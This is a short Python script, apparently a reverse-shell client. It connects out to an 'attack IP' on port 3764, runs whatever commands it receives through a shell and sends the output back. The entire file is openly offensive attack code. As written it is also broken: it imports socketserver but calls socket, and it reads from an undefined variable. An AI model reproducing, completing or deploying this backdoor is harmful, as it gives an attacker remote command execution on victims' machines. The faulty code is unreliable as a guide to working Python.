import socketserver
import subprocess
import os

HOST = ""  # attack IP
PORT = 3764  # attack property

connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
connection_socket.connect((HOST, PORT))

while True:
    cmd = connection_socket.recv(1024)

    if (cmd == "quit"):
        break

    if (cmd.split()[0] == "cd"):
        os.chdir(cmd.split()[1])
        connection_socket.send(("Changed directory to " + os.getcwd()))
    else:
        shell_execute = subprocess.Popen(cmd,
                                         shell=True,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE,
                                         stdin=subprocess.PIPE)
        stdout_val = proc.stdout.read() + proc.stderr.read()  # cmd output
        connection_socket.send(stdout_val)

connection_socket.close()
